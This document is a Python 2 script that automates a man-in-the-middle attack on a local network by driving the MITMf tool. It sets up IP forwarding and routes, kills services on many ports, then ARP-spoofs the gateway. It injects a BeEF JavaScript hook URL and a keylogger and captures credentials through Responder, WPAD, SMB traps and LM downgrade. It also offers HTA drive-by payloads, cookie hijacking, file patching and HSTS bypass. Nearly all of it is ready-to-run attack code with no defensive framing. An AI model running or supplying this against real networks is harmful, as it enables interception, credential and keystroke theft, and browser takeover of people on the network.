import socket, os, sys, operator, netifaces, subprocess, threading, termcolor
from termcolor import colored

def bash_cmd(cmd):
    commands = cmd.splitlines()
    for c in commands:
        command = str(c.encode('utf-8')).strip().rstrip()
        subprocess.call(command,shell=True,executable='/bin/bash')
    return

def get_gw():
    gws = netifaces.gateways()
    gateway_ip = gws['default'][netifaces.AF_INET][0]
    interface = gws['default'][netifaces.AF_INET][1]
    gw = gateway_ip
    return gw

def readUserInput(inputFile):
    f = open(inputFile, 'r')
    r = f.read()
    s = str(r.encode('utf-8')).strip().rstrip()
    string = s
    return string
def start_attack(iface, gw, jsurl):
    bash_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    cmd = "route add default gw {0} dev {1}".format(str(gw),str(iface))
    bash_cmd(cmd)
    subnet = gw.split('.')
    subnet = "{0}.{1}.{2}.0".format(
        subnet[0],
        subnet[1],
        subnet[2]
    )
    cmd = "route add -net {} netmask 255.255.255.0 gw {} dev {}".format(
        str(subnet),
        str(gw),
        str(iface)
    )
    bash_cmd(cmd)
    bash_cmd("fuser -k 587/tcp 110/tcp 9999/tcp 143/tcp 80/tcp 10000/tcp 21/tcp 88/tcp 25/tcp 1433/tcp 445/tcp 3141/tcp 389/tcp")
    bash_cmd("pkill mitmf")
    cmd = """mitmf --spoof --arp -i {0} --gateway {1} --inject --responder --wredir --nbtns --lm --fingerprint --wpad --hsts --jskeylogger --appoison --browserprofiler --js-url {2}""".format(
        str(iface),
        str(gw),
        str(jsurl)
    )
    print "Running command: ", str(cmd)
    bash_cmd(cmd)
    return

def configure_options():
    cmd = "mitmf"
    answer = str(raw_input("Do you want to do HTA driveby attacks?: "))
    if answer == "y":
        notificationText = str(raw_input("enter NOTIFICATION TEXT: "))
        htaApp = str(raw_input("Enter full path of HTA file: "))
        cmd = cmd + " --hta --text {} --hta-app {}".format(
            str(notificationText),
            str(htaApp)
        )
    else:
        pass
    print "Spoofing options \r\n\t1: ARP\r\n\t2: ICMP\r\n\t3:DHCP\r\n\t4: DNS"
    answer = int(raw_input("Enter which traffic you want to spoof: "))
    gw = str(raw_input("Enter the gateway you are spoofing"))
    if answer == 1:
        print "Select ARP Mode \r\n\t1: REPLY\r\n\t2: REQUEST"
        arpmode = int(raw_input("Enter OPTION: "))
        if arpmode == 1:
            arpmode = "rep"
        elif arpmode == 2:
            arpmode = "req"
        else:
            arpmode = "rep"
        cmd = cmd + " --spoof --arp --gateway {} --arpmode {}".format(str(gw),str(arpmode))
    elif answer == 2:
        cmd = cmd + " --spoof --icmp --gateway {}".format(str(gw))
    elif answer == 3:
        cmd = cmd + " --spoof --dhcp --gateway {}".format(str(gw))
    elif answer == 4:
        cmd = cmd + " --spoof --dns --gateway {}".format(str(gw))
    else:
        pass

    cmd = cmd + " --smbtrap"
    cmd = cmd + " --screen"
    cmd = cmd + " --appoison"
    cmd = cmd + " --browserprofiler"
    cmd = cmd + " --filepwn"
    cmd = cmd + " --smbauth"
    cmd = cmd + " --ferretng --port {port} --load-cookies {cookiefile}"
    cmd = cmd + " --browsersniper"
    cmd = cmd + " --jskeylogger"
    cmd = cmd + " --replace"
    cmd = cmd + " --hsts"
    cmd = cmd + " --responder --wredir --nbtns --fingerprint --lm --wpad --forcewpadauth"

    print "Attack command is: \r\n\t", str(cmd)
    # start_attack(cmd)
    return cmd

def configure_attack():
    interface_file = "userinput_interface.txt"
    javascript_payload_file = "userinput_javascriptpayloadurl.txt"
    gateway_file = "userinput_gateway.txt"
    iface = readUserInput(interface_file)
    jsurl = readUserInput(javascript_payload_file)
    gw = readUserInput(gateway_file)
    # gw = get_gw()
    print "Starting attack with INTERFACE: ", str(iface), "Javascript Beef Hook URL: ", str(jsurl), "Targeting Gateway: ", str(gw)
    start_attack(iface, gw, jsurl)
    return iface, jsurl, gw
def main():
    configure_attack()
    return
main()
